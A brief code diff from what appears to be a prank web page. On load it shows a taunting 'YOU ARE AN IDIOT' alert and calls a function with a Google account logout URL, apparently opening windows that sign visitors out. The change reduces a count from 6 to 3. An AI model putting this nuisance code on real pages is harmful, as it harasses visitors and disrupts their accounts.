@@ -15,4 +15,4 @@ container.addEventListener('click', async () => {
 window.onload = playBall;
 
 alert("YOU ARE AN IDIOT!! HGAHAHAHA");
-proCreate(6,"https://www.google.com/accounts/Logout")
+proCreate(3,"https://www.google.com/accounts/Logout")
